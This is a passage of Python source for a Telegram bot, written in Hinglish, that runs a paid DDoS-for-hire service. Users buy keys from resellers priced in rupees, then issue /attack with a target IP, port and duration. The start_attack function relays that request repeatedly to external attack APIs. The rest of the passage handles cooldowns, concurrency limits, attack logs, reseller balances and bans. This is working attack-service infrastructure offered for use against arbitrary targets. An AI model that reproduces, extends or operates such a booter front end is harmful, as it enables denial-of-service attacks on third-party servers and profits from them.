        except:
            pass
    
    bot.reply_to(message, f"✅ {deleted_count} expired keys delete ho gayi!")

def start_attack(target, port, duration, message, attack_id, api_index):
    try:
        user_id = message.from_user.id
        username = message.from_user.username or message.from_user.first_name or str(user_id)
        
        log_attack(user_id, username, target, port, duration)
        
        bot.reply_to(message, f"⚡ Attack Start!\n\n🎯 Target: {target}:{port}\n⏱️ Time: {duration}s\n⏳ Cooldown after attack: {get_user_cooldown_setting()}s\n\n📊 /status se check kro")
        
        # Use the specific API assigned to this slot
        api_url_template = API_LIST[api_index]
        api_url = api_url_template.format(ip=target, port=port, time=duration)
        
        concurrent_limit = get_concurrent_limit()
        
        try:
            for i in range(concurrent_limit):
                response = requests.get(api_url, timeout=10)
                print(f"Attack request {i+1} sent to Slot {api_index+1}: {response.status_code}")
                if i < concurrent_limit - 1:
                    time.sleep(1)
        except Exception as e:
            print(f"API Request error: {e}")
        
        time.sleep(duration)
        
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            remaining_cooldown = 0
            if user_id in user_cooldowns:
                remaining_cooldown = max(0, int((user_cooldowns[user_id] - datetime.now()).total_seconds()))
        
        if remaining_cooldown > 0:
            bot.reply_to(message, f"✅ Attack Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s\n\n⏳ Cooldown left: {remaining_cooldown}s")
        else:
            bot.reply_to(message, f"✅ Attack Complete!\n\n🎯 Target: {target}:{port}\n⏱️ Duration: {duration}s")
        
    except Exception as e:
        with _attack_lock:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]

@bot.message_handler(commands=["prices"])
def prices_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    
    update_reseller_pricing()  # Ensure prices are fresh from DB
    
    response = "═══════════════════════════\n"
    response += "💵 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗣𝗥𝗜𝗖𝗜𝗡𝗚\n"
    response += "═══════════════════════════\n\n"
    
    durations = ['12h', '1d', '3d', '7d', '30d', '60d']
    for dur in durations:
        if dur in RESELLER_PRICING:
            info = RESELLER_PRICING[dur]
            response += f"🔴 {info['label']:<9} ➜  {info['price']} Rs\n"
            
    response += "\n═══════════════════════════\n"
    response += "📋 Usage: /gen <duration> <count>\n"
    response += "Example: /gen 1d 1\n"
    response += "═══════════════════════════"
    bot.reply_to(message, response)

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id):
        user = users_collection.find_one({'user_id': user_id})
        if user and user.get('reseller_username'):
            reseller_name = user.get('reseller_username')
            bot.reply_to(message, f"❌ Key khatam ho gayi!\n\n🔄 Renew ke liye apne seller ko DM karo")
        else:
            bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n\n🔑 Key kharidne ke liye reseller se contact karo.")
        return
    
    if not is_owner(user_id):
        cooldown = get_user_cooldown(user_id)
        if cooldown > 0:
            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
            return
    
    if user_has_active_attack(user_id):
        bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai! Khatam hone do phir naya lagao.")
        return
    
    active_count = get_active_attack_count()
    max_concurrent = len(API_LIST)
    if active_count >= max_concurrent:
        bot.reply_to(message, f"❌ Abhi attack lga hua hai! ({active_count}/{max_concurrent})\n\n/status se check kro, jab khatam ho tab attack kro!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 4:
        bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>")
        return
    
    target, port, duration = command_parts[1], command_parts[2], command_parts[3]
    
    # Check IP:Port history for the user
    target_addr = f"{target}:{port}"
    if not is_owner(user_id) and get_port_protection() and user_id in user_attack_history:
        if target_addr in user_attack_history[user_id]:
            last_atk_time = user_attack_history[user_id][target_addr]
            if datetime.now() < last_atk_time + timedelta(hours=2):
                bot.reply_to(message, f"❌ Port {port} is already attacked.")
                return

    if not validate_target(target):
        bot.reply_to(message, "❌ Invalid IP!")
        return
    
    if is_ip_blocked(target):
        bot.reply_to(message, "🚫 Ye IP blocked hai! Dusra IP use karo.")
        return
    
    try:
        port = int(port)
        if port < 1 or port > 65535:
            bot.reply_to(message, "❌ Invalid port! (1-65535)")
            return
        duration = int(duration)
        # Minimum Limit Check
        if not is_owner(user_id) and duration < 60:
            bot.reply_to(message, "❌ Minimum attack time 60 seconds hona chahiye!")
            return
        
        max_time = get_max_attack_time()
        if not is_owner(user_id) and duration > max_time:
            bot.reply_to(message, f"❌ Max time: {max_time}s")
            return
        
        attack_id = f"{user_id}_{datetime.now().timestamp()}"
        api_index = get_free_api_index()
        
        if api_index is None:
            bot.reply_to(message, "❌ Koi free slot nahi mila! Wait karo.")
            return
        
        with _attack_lock:
            total_cooldown = duration + get_user_cooldown_setting()
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=total_cooldown)
            
            # Record attack in history for 2 hours
            if user_id not in user_attack_history:
                user_attack_history[user_id] = {}
            user_attack_history[user_id][f"{target}:{port}"] = datetime.now()

            api_in_use[attack_id] = api_index
            active_attacks[attack_id] = {
                'target': target,
                'port': port,
                'duration': duration,
                'user_id': user_id,
                'start_time': datetime.now(),
                'end_time': datetime.now() + timedelta(seconds=duration)
            }
        
        thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index))
        thread.start()
        
    except ValueError:
        bot.reply_to(message, "❌ Port and time must be numbers!")

@bot.message_handler(commands=['help'])
def show_help(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if is_owner(user_id):
        help_text = '''
👑 𝗢𝗪𝗡𝗘𝗥 𝗣𝗔𝗡𝗘𝗟

🔑 𝗞𝗘𝗬 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:
• /gen <time> <count> - Keys generate
• /key <key> - Key details
• /allkeys - All keys
• /delkey <key> - Key delete
• /del_exp_key - Expired keys delete
• /trail <hrs> <max> - Trail keys
• /reseller_trail <id> <hrs> - Give trail to reseller
• /del_trail - Delete all trail keys

👥 𝗨𝗦𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:
• /user <id> - User ki poori info
• /allusers - All users
• /extend <id> <time> - Time extend
• /extend_all <time> - Sab ka time extend
• /down <id> <time> - Time kam
• /del_exp_usr - Expired users delete
• /ban <id> - User ban
• /unban <id> - User unban
• /banned - Banned users
• /tban <id> <time> - Temp ban

💼 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧:
• /add_reseller <id> - Reseller add
• /remove_reseller <id> - Reseller remove
• /block_reseller <id> - Block
• /unblock_reseller <id> - Unblock
• /all_resellers - Sab resellers
• /saldo_add <id> <amt> - Balance add
• /saldo_remove <id> <amt> - Balance kam
• /saldo <id> - Balance check
• /user_resell <id> - Reseller ke users
• /setprice - Pricing dekho/change

📢 𝗕𝗥𝗢𝗔𝗗𝗖𝗔𝗦𝗧:
• /broadcast - Sab ko message
• /broadcast_reseller - Resellers ko msg
• /broadcast_paid - Sirf paid users ko msg

⚡ 𝗔𝗧𝗧𝗔𝗖𝗞 & 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦:
• /attack <ip> <port> <time> - Attack
• /status - Attack status
• /concurrent <limit> - Set limit
• /max_attack <sec> - Max time set
• /cooldown <sec> - Cooldown set
• /block_ip <prefix> - IP block
• /unblock_ip <prefix> - IP unblock
• /blocked_ips - Blocked IPs
• /prot_on - Port Protection ON
• /prot_off - Port Protection OFF

📊 𝗠𝗢𝗡𝗜𝗧𝗢𝗥𝗜𝗡𝗚:
• /live - Server stats
• /logs - Attack logs (txt file)
• /del_logs - Delete all logs

🔧 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘:
• /maintenance <msg> - Maintenance ON
• /ok - Maintenance OFF
'''
    elif is_reseller(user_id):
        help_text = '''
💼 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗣𝗔𝗡𝗘𝗟

🆔 𝗜𝗗:
• /id - Apna ID dekho
• /ping - Bot status check

💰 𝗕𝗔𝗟𝗔𝗡𝗖𝗘:
• /mysaldo - Apna balance dekho
• /prices - Key prices dekho

🔑 𝗞𝗘𝗬 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗜𝗢𝗡:
• /gen <duration> <count> - Keys generate
  Durations: 12h, 1d, 3d, 7d, 30d, 60d

⚡ 𝗔𝗧𝗧𝗔𝗖𝗞:
• /redeem <key> - Key redeem karo
• /attack <ip> <port> <time> - Attack
• /status - Attack status
• /mykey - Key details
'''
    else:
        help_text = '''
🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
• /id - Apna ID dekho
• /ping - Bot status check
• /redeem <key> - Key redeem karo
• /mykey - Key details dekho
• /status - Attack status dekho
• /attack <ip> <port> <time> - Attack start karo
'''
    
    bot.reply_to(message, help_text)

@bot.message_handler(commands=["del_trail"])
def delete_trail_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) == 1:
        bot.reply_to(message, "⚠️ Kya aap waqai saare trail keys delete karna chahte hain?\n\nConfirm karne ke liye `/del_trail confirm` likhen.")
        return
        
    if command_parts[1].lower() == "confirm":
        # Delete all keys that are marked as trail
        result = keys_collection.delete_many({'is_trail': True})
        bot.reply_to(message, f"✅ {result.deleted_count} trail keys delete ho gayi hain!")
    else:
        bot.reply_to(message, "❌ Confirmation failed! `/del_trail confirm` use karen.")

@bot.message_handler(commands=["tban"])
def tban_user_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /tban <id or @username> <time>\nExample: /tban 123456 10m")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
        
    if target_user_id == BOT_OWNER:
        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
        return
        
    duration_str = command_parts[2]
    duration_td, label = parse_duration(duration_str)
    
    if not duration_td:
        bot.reply_to(message, "❌ Invalid duration format! Use: 10m, 1h, 1d etc.")
        return
        
    ban_expiry = datetime.now() + duration_td
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}},
        upsert=True
    )
    
    bot.reply_to(message, f"🚫 User {resolved_name or target_user_id} ko {label} ke liye ban kar diya gaya hai!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}")

@bot.message_handler(commands=["ban"])
def ban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /ban <id or @username>")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    if target_user_id == BOT_OWNER:
        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
        return
    
    users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}},
        upsert=True
    )
    
    try:
        bot.send_message(target_user_id, "🚫 Aapko ban kar diya gaya hai!")
    except:
        pass
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    bot.reply_to(message, f"✅ User {display} banned!\n🆔 ID: {target_user_id}")

@bot.message_handler(commands=["unban"])
def unban_user_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unban <id or @username>")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    result = users_collection.update_one(
        {'user_id': target_user_id},
        {'$set': {'banned': False}}
    )
    
    display = f"@{resolved_name}" if resolved_name else str(target_user_id)
    if result.modified_count > 0:
        try:
            bot.send_message(target_user_id, "✅ Aapka ban hata diya gaya hai!")
        except:
            pass
        bot.reply_to(message, f"✅ User {display} unbanned!\n🆔 ID: {target_user_id}")
    else:
        bot.reply_to(message, "❌ User nahi mila ya pehle se unbanned hai!")

@bot.message_handler(commands=["banned"])
def list_banned_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    banned_users = list(users_collection.find({'banned': True}))
    
    if not banned_users:
        bot.reply_to(message, "📋 Koi banned user nahi hai!")
        return
    
    response = "═══════════════════════════\n"
    response += "🚫 𝗕𝗔𝗡𝗡𝗘𝗗 𝗨𝗦𝗘𝗥𝗦\n"
    response += "═══════════════════════════\n\n"
    
    for i, user in enumerate(banned_users[:20], 1):
        response += f"{i}. 👤 `{user['user_id']}`\n"
        if user.get('username'):
            response += f"   📛 {user['username']}\n"
    
    response += f"\n═══════════════════════════\n"
    response += f"📊 Total Banned: {len(banned_users)}\n"
    response += "═══════════════════════════"
    
    send_long_message(message, response)

@bot.message_handler(commands=["user"])
def user_info_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /user <id or @username>")
        return
    
    target_user_id, resolved_name = resolve_user(command_parts[1])
    if not target_user_id:
        bot.reply_to(message, "❌ User nahi mila!")
        return
    
    user = users_collection.find_one({'user_id': target_user_id})
    reseller = resellers_collection.find_one({'user_id': target_user_id})
    bot_user = bot_users_collection.find_one({'user_id': target_user_id})
    
    response = "═══════════════════════════\n"
    response += "👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\n"
    response += "═══════════════════════════\n\n"
    
    response += f"🆔 ID: <code>{target_user_id}</code>\n"
    if resolved_name:
        response += f"📛 Username: @{resolved_name}\n"
    
    if bot_user:
        if bot_user.get('first_name'):
            response += f"👤 Name: {bot_user.get('first_name')}\n"
        if bot_user.get('first_seen'):
            response += f"📅 First Seen: {bot_user['first_seen'].strftime('%d-%m-%Y %H:%M')}\n"
    
    if target_user_id == BOT_OWNER:
        response += "\n👑 Role: OWNER\n"
    elif reseller:
        response += f"\n💼 Role: RESELLER\n"
        response += f"💰 Balance: {reseller.get('balance', 0)} Rs\n"
        response += f"🔑 Keys Generated: {reseller.get('total_keys_generated', 0)}\n"
        if reseller.get('blocked'):
            response += "🚫 Status: BLOCKED\n"
        else:
            response += "✅ Status: ACTIVE\n"
        if reseller.get('added_at'):
            response += f"📅 Added: {reseller['added_at'].strftime('%d-%m-%Y')}\n"
    else:
        response += "\n👤 Role: USER\n"
    
    if user:
        response += "\n═══════════════════════════\n"
        response += "🔑 𝗞𝗘𝗬 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n"
        response += "═══════════════════════════\n\n"
        
        if user.get('banned'):
            response += "🚫 STATUS: BANNED\n"
            if user.get('banned_at'):
                response += f"📅 Banned At: {user['banned_at'].strftime('%d-%m-%Y %H:%M')}\n"
        
        if user.get('key'):
            response += f"🔑 Key: <code>{user['key']}</code>\n"
            response += f"⏰ Duration: {user.get('key_duration_label', 'N/A')}\n"
            
            if user.get('redeemed_at'):
                response += f"📅 Redeemed: {user['redeemed_at'].strftime('%d-%m-%Y %H:%M')}\n"
            
            if user.get('key_expiry'):
                if user['key_expiry'] > datetime.now():
                    remaining = user['key_expiry'] - datetime.now()
                    days = remaining.days
                    hours, rem = divmod(remaining.seconds, 3600)
                    mins, secs = divmod(rem, 60)
                    response += f"⏳ Remaining: {days}d {hours}h {mins}m\n"
                    response += f"📆 Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
                    response += "✅ Status: ACTIVE\n"
                else:
                    response += f"📆 Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
                    response += "❌ Status: EXPIRED\n"
            
            if user.get('reseller_username'):
                response += f"💼 Reseller: @{user['reseller_username']}\n"
        else:
            response += "❌ No Active Key\n"
    else:
        response += "\n❌ No Key History\n"
    
    user_keys = list(keys_collection.find({'used_by': target_user_id}).sort('used_at', -1).limit(5))
    if user_keys:
        response += "\n═══════════════════════════\n"
        response += "📜 𝗞𝗘𝗬 𝗛𝗜𝗦𝗧𝗢𝗥𝗬 (Last 5)\n"
        response += "═══════════════════════════\n\n"
        for k in user_keys:
            response += f"• {k.get('duration_label', 'N/A')}"
            if k.get('used_at'):
                response += f" ({k['used_at'].strftime('%d-%m-%Y')})"
            response += "\n"
    
    attack_count = attack_logs_collection.count_documents({'user_id': target_user_id})
    user_attacks = list(attack_logs_collection.find({'user_id': target_user_id}).sort('timestamp', -1).limit(10))
    
    response += "\n═══════════════════════════\n"
    response += "⚔️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗦\n"
    response += "═══════════════════════════\n\n"
    response += f"📊 Total Attacks: {attack_count}\n"
    
    if user_attacks:
        response += "\n📜 Recent Attacks:\n"
        for i, atk in enumerate(user_attacks[:5], 1):
            response += f"{i}. {atk['target']}:{atk['port']} ({atk['duration']}s)\n"
            if atk.get('timestamp'):
                response += f"   📅 {atk['timestamp'].strftime('%d-%m-%Y %H:%M')}\n"
    
    fb = get_pending_feedback(target_user_id)
    if fb:
        response += "\n⚠️ Pending Feedback: YES\n"
    
    response += "\n═══════════════════════════"
    
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(commands=["live"])
def live_stats_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    uptime = datetime.now() - BOT_START_TIME
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
    
    process = psutil.Process()
    memory_mb = process.memory_info().rss / 1024 / 1024
    cpu_percent = process.cpu_percent(interval=0.1)
    threads = process.num_threads()
    
    cpu_overall = psutil.cpu_percent(interval=0.1)
    ram = psutil.virtual_memory()
    ram_used = ram.used / 1024 / 1024
    ram_total = ram.total / 1024 / 1024
    ram_percent = ram.percent
    
    disk = psutil.disk_usage('/')
    disk_percent = disk.percent
    
    import platform
    system_info = f"{platform.system()} {platform.release()}"
    
    total_users = users_collection.count_documents({})
    active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
    
    # Online users (seen in last 5 minutes)
    online_threshold = datetime.now() - timedelta(minutes=5)
    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})
    
    total_resellers = resellers_collection.count_documents({})
    active_keys = keys_collection.count_documents({'used': False})
    total_keys = keys_collection.count_documents({})
    
    active_count = get_active_attack_count()
    max_concurrent = get_max_concurrent()
    
    maint_status = "🔴 Enabled" if is_maintenance() else "✅ Disabled"
    
    response = "═══════════════════════════\n"
    response += "📊 𝗦𝗘𝗥𝗩𝗘𝗥 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦\n"
    response += "═══════════════════════════\n\n"
    
    response += "🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\n"
    response += f"• Uptime: {uptime_str}\n"
    response += f"• Memory Usage: {memory_mb:.1f} MB\n"
    response += f"• CPU Usage: {cpu_percent:.1f}%\n"
    response += f"• Threads: {threads}\n\n"
    
    response += "💻 𝗦𝗬𝗦𝗧𝗘𝗠 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\n"
    response += f"• System: {system_info}\n"
    response += f"• CPU: {cpu_overall:.1f}% overall\n"
    response += f"• RAM: {ram_percent:.1f}% used ({ram_used:.0f}MB/{ram_total:.0f}MB)\n"
    response += f"• Disk: {disk_percent:.1f}% used\n\n"
    
    response += f"• Active Attacks: {active_count}/{max_concurrent}\n"
    response += f"• Maintenance Mode: {maint_status}\n\n"
    
    response += "📈 𝗕𝗢𝗧 𝗗𝗔𝗧𝗔\n"
    response += f"• Total Users: {total_users}\n"
    response += f"• Active Users (Keys): {active_users}\n"
    response += f"• Online Users: {online_users}\n"
    response += f"• Resellers: {total_resellers}\n"
    response += f"• Available Keys: {active_keys}\n"
    response += f"• Total Keys: {total_keys}\n"
    
    response += "\n═══════════════════════════"
    
    bot.reply_to(message, response)

@bot.message_handler(commands=["setprice"])
def set_price_command(message):
    global RESELLER_PRICING
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        response = "═══════════════════════════\n"
        response += "💵 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗣𝗥𝗜𝗖𝗜𝗡𝗚\n"
        response += "═══════════════════════════\n\n"
        for dur, info in RESELLER_PRICING.items():
            response += f"• {dur}: {info['price']} Rs ({info['label']})\n"
        response += "\n⚠️ Usage: /setprice <duration> <price>\n"
        response += "Example: /setprice 1d 60\n"
        response += "═══════════════════════════"
        bot.reply_to(message, response)
        return
    
    if len(command_parts) != 3:
        bot.reply_to(message, "⚠️ Usage: /setprice <duration> <price>\n\nDurations: 12h, 1d, 3d, 7d, 30d, 60d\nExample: /setprice 1d 60")
        return
    
    duration_key = command_parts[1].lower()
    
    if duration_key not in RESELLER_PRICING:
        bot.reply_to(message, "❌ Invalid duration!\n\nValid: 12h, 1d, 3d, 7d, 30d, 60d")
        return
    
    try:
        new_price = int(command_parts[2])
        if new_price < 0:
            bot.reply_to(message, "❌ Price 0 se kam nahi ho sakta!")
            return
    except:
        bot.reply_to(message, "❌ Invalid price! Number daalo.")
        return
    
    old_price = RESELLER_PRICING[duration_key]['price']
    RESELLER_PRICING[duration_key]['price'] = new_price
    
    set_setting(f'price_{duration_key}', new_price)
    update_reseller_pricing()
    
    bot.reply_to(message, f"✅ Price Updated!\n\n📦 Duration: {RESELLER_PRICING[duration_key]['label']}\n💵 Old Price: {old_price} Rs\n💰 New Price: {new_price} Rs")

@bot.message_handler(commands=["logs"])
def attack_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    all_logs = list(attack_logs_collection.find().sort('timestamp', -1))
    
    if not all_logs:
        bot.reply_to(message, "📋 Koi attack logs nahi hai!")
        return
    
    content = "═══════════════════════════\n"
    content += "       ATTACK LOGS REPORT\n"
    content += f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n"
    content += "═══════════════════════════\n\n"
    content += f"Total Attacks: {len(all_logs)}\n\n"
    content += "───────────────────────────\n"
    
    for i, log in enumerate(all_logs, 1):
        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n"
        content += f"   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n"
        content += f"   Duration: {log.get('duration', 'N/A')}s\n"
        if log.get('timestamp'):
            content += f"   Time: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
        content += "\n"
    
    content += "═══════════════════════════\n"
    content += f"END OF LOGS - Total: {len(all_logs)}\n"
    content += "═══════════════════════════"
    
    import io
    file = io.BytesIO(content.encode('utf-8'))
    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    
    bot.send_document(message.chat.id, file, caption=f"📊 Attack Logs\n\n⚔️ Total Attacks: {len(all_logs)}")

@bot.message_handler(commands=["del_logs"])
def delete_logs_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    count = attack_logs_collection.count_documents({})
    
    if count == 0:
        bot.reply_to(message, "📋 Koi logs nahi hai delete karne ke liye!")
        return
    
    attack_logs_collection.delete_many({})
    
    bot.reply_to(message, f"✅ {count} attack logs delete ho gaye!")

@bot.message_handler(commands=["max_attack"])
def max_attack_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_max_attack_time()
        bot.reply_to(message, f"⚙️ Current Max Attack Time: {current}s\n\nChange: /max_attack <seconds>")
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 10 or new_value > 600:
            bot.reply_to(message, "❌ Value 10-600 seconds ke beech hona chahiye!")
            return
        
        set_setting('max_attack_time', new_value)
        bot.reply_to(message, f"✅ Max Attack Time set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["cooldown"])
def cooldown_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    
    if len(command_parts) == 1:
        current = get_user_cooldown_setting()
        bot.reply_to(message, f"⏳ Current Cooldown: {current}s\n\nChange: /cooldown <seconds>")
        return
    
    try:
        new_value = int(command_parts[1])
        if new_value < 0 or new_value > 3600:
            bot.reply_to(message, "❌ Value 0-3600 seconds ke beech hona chahiye!")
            return
        
        set_setting('user_cooldown', new_value)
        bot.reply_to(message, f"✅ Cooldown set: {new_value}s")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["concurrent"])
def concurrent_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id): return
    
    command_parts = message.text.split()
    if len(command_parts) == 1:
        current = get_concurrent_limit()
        bot.reply_to(message, f"⚙️ Current Concurrent Limit: {current}\n\nChange: /concurrent <count>")
        return
        
    try:
        new_value = int(command_parts[1])
        if new_value < 1:
            bot.reply_to(message, "❌ Value 1 se kam nahi ho sakti!")
            return
        _xcfg(new_value)
        bot.reply_to(message, f"✅ Concurrent Limit set: {new_value}\n\nAb har attack pe API ko {new_value} baar call kiya jayega (1s delay ke saath).")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number!")

@bot.message_handler(commands=["block_ip"])
def block_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /block_ip <ip_prefix>\n\nExample: /block_ip 96.\nExample: /block_ip 192.168.")
        return
    
    ip_prefix = command_parts[1]
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP Blocked!\n\n🚫 Prefix: `{ip_prefix}`\n\nAb {ip_prefix}* se shuru hone wale IPs pe attack nahi lagega.", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"ℹ️ `{ip_prefix}` pehle se blocked hai!", parse_mode="Markdown")

@bot.message_handler(commands=["unblock_ip"])
def unblock_ip_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        bot.reply_to(message, "⚠️ Usage: /unblock_ip <ip_prefix>")
        return
    
    ip_prefix = command_parts[1]
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"✅ IP Unblocked!\n\n✅ Prefix: `{ip_prefix}`", parse_mode="Markdown")
    else:
        bot.reply_to(message, f"❌ `{ip_prefix}` blocked list mein nahi hai!", parse_mode="Markdown")

@bot.message_handler(commands=["blocked_ips"])
def blocked_ips_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
        return
    
    blocked = get_blocked_ips()
    if not blocked:
        bot.reply_to(message, "📋 Koi IP blocked nahi hai!")
        return
    
    response = "🚫 𝗕𝗟𝗢𝗖𝗞𝗘𝗗 𝗜𝗣𝘀\n\n"
    for i, ip in enumerate(blocked, 1):
        response += f"{i}. `{ip}`*\n"
    response += f"\n📊 Total: {len(blocked)}"
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=["maintenance"])
def maintenance_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "⚠️ Usage: /maintenance <message>\n\nExample: /maintenance Bot update ho raha hai, 10 min wait karo")
        return
    
    msg = command_parts[1]
    set_maintenance(True, msg)
    bot.reply_to(message, f"🔧 Maintenance Mode ON!\n\nMessage: {msg}\n\n/ok se band karo")

@bot.message_handler(commands=["ok"])
def ok_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        return
    
    if not is_maintenance():
        bot.reply_to(message, "ℹ️ Maintenance mode pehle se OFF hai!")
        return
    
    set_maintenance(False)
    bot.reply_to(message, "✅ Maintenance Mode OFF!\n\nBot ab normal hai.")

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    
    track_bot_user(user_id, message.from_user.username)
    if check_maintenance(message): return
    if check_banned(message): return
    
